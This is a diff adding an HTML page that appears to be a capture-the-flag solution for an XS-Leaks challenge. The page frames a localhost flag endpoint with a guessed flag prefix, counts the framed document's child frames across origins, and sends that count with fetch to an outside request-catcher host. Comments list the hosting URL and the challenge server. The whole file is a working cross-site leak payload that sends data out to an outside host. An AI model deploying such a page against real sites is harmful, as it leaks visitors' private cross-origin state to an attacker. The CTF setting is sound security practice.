@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Iframe</title>
+</head>
+<body>
+    <h1>Open Iframe</h1>
+    <iframe id="mainframe" src="http://localhost:80/flag?flag=hspace" width="600" height="400" onload="sendCount()"></iframe>
+
+    <script>
+        function sendCount() {
+            const frame = document.getElementById("mainframe");
+            let childcount = frame.contentWindow.frames.length;
+            fetch("https://odsodmh.request.dreamhack.games?count=" + childcount);
+        }
+    </script>
+</body>
+</html>
+
+
+//https://dotorikko.github.io/static/js/test.html
+//http://war.sschall.xyz:60001/flag?flag=s
